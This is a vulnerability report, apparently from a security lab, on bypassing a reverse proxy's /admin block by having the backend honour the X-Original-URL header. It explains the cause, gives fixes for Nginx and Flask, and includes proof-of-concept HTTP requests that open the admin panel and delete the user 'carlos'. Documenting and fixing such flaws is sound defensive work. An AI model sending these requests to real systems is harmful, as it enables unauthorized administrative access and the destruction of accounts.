# Vulnerability Report: Front-End Access Control Bypass via X-Original-URL Header Override

* **Vulnerability Type:** Access Control Bypass (CWE-288) / HTTP Request Smuggling / Parser Discrepancy (CWE-436) / Missing Authorization (CWE-862)

* **Severity:** High

* **Target Component:** Reverse Proxy / WAF Access Control Rules & Backend Framework Routing (`X-Original-URL`)

* **OWASP Top 10 Mapping:** A01:2021 – Broken Access Control

## 1. Executive Summary

A critical architecture-level access control bypass vulnerability was identified. The application relies on a front-end reverse proxy or Web Application Firewall (WAF) to restrict access to sensitive administrative URL paths (`/admin`). However, the backend application framework supports the non-standard `X-Original-URL` request header to determine internal route dispatching. By sending a request line targeting a public path (`GET /`) alongside an `X-Original-URL: /admin` header, an unauthenticated remote attacker can bypass front-end security filters, access the administrative dashboard, and execute administrative operations such as user account deletion.

## 2. Technical Analysis & Root Cause

The vulnerability stems from an architectural mismatch (parser differential) between the perimeter security device enforcing access policy and the backend framework handling routing logic.

### Structural Flaw Breakdown

1. **Perimeter-Only Security Enforcement:** The front-end proxy inspects incoming HTTP request lines. It blocks requests where the URL path matches restricted rules (e.g., `GET /admin` $\rightarrow$ `403 Forbidden`), but does not strip or evaluate non-standard override headers.

2. **Framework Route Override:** The backend web framework honors `X-Original-URL` (or `X-Rewrite-URL`) to allow URL rewriting on environments where standard web server rewrite modules are unavailable.

3. **Decoupled Authorization Logic:** The backend application assumes that any request reaching it has already undergone perimeter path authorization, omitting duplicate role checks inside internal controllers.

```
[ Attacker ]
     |
     | GET / HTTP/1.1
     | Host: target-app.net
     | X-Original-URL: /admin
     v
[ Front-End Proxy / WAF ]
     |
     | 1. Checks request line path: "/" -> Allowed!
     | 2. Forwards unmodified request to backend
     v
[ Backend Web Framework ]
     |
     | 3. Detects header: X-Original-URL: /admin
     | 4. Overrides internal routing path to /admin
     | 5. Executes admin controller (No session authorization check)
     v
[ Access Granted / Deletion Executed ]

```

## 3. Proof of Concept (PoC)

1. Attempt direct access to the administrative endpoint:

   ```
   GET /admin HTTP/1.1
   Host: target-app.net
   
   ```

   *Observed Response:* `HTTP/1.1 403 Forbidden` (Access Denied by front-end proxy rule).

2. Intercept the request using Burp Suite and inject the `X-Original-URL` header while setting the request line path to `/`:

   ```
   GET / HTTP/1.1
   Host: target-app.net
   X-Original-URL: /admin
   
   ```

3. **Observe Response:** The server returns `HTTP/1.1 200 OK`, rendering the full administrative control panel.

4. Construct the deletion payload targeting user `carlos`. Place the action route in `X-Original-URL` and pass query parameters on the request line:

   ```
   GET /?username=carlos HTTP/1.1
   Host: target-app.net
   X-Original-URL: /admin/delete
   
   ```

5. **Result:** The backend framework executes `/admin/delete` with parameter `username=carlos`, returning `HTTP 200 OK`. User `carlos` is deleted.

## 4. Impact

* **Complete Access Control Bypass:** Evasion of perimeter access control mechanisms, WAF rules, and reverse proxy security controls.

* **Unauthorized Privilege Execution:** Unauthenticated users can access restricted endpoints and execute administrative commands.

* **Architectural Ambiguity:** Discrepancy between edge security assumptions and backend implementation logic.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Disable Routing Override Headers:**
   Disable framework features or middleware modules that honor `X-Original-URL`, `X-Rewrite-URL`, or similar headers unless explicitly required.

2. **Sanitize Headers at the Front-End Proxy:**
   Configure front-end reverse proxies, load balancers, and WAFs to strip `X-Original-URL` and `X-Rewrite-URL` headers from incoming client requests before proxying them downstream.

3. **Enforce Defense in Depth (Server-Side Authorization):**
   Do not rely exclusively on front-end edge devices to block restricted paths. Implement explicit server-side authentication and role-based access control (RBAC) within backend controller handlers.

#### Secure Proxy Configuration Example (Nginx)

```nginx
# Strip dangerous routing override headers at the edge
http {
    server {
        listen 80;
        server_name target-app.net;

        location / {
            # Prevent client-supplied override headers from reaching backend services
            proxy_set_header X-Original-URL "";
            proxy_set_header X-Rewrite-URL "";
            
            proxy_pass http://backend_cluster;
        }
    }
}
```

#### Secure Backend Code Implementation Example (Python / Flask)

```python
from flask import Flask, request, abort, session

app = Flask(__name__)

@app.route('/admin/delete')
def admin_delete():
    # Enforce strict server-side authorization check inside the controller
    if not session.get('is_authenticated') or session.get('role') != 'ADMIN':
        abort(403) # Return 403 Forbidden regardless of how the route was reached
        
    username = request.args.get('username')
    # Execute deletion logic
    return f"User {username} deleted successfully.", 200
```

## 6. References

* **CWE-288:** [Authentication Bypass Using an Alternate Path or Channel](https://cwe.mitre.org/data/definitions/288.html)

* **CWE-436:** [Interpretation Conflict ('Parser Differential')](https://cwe.mitre.org/data/definitions/436.html)

* **OWASP:** [Broken Access Control Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)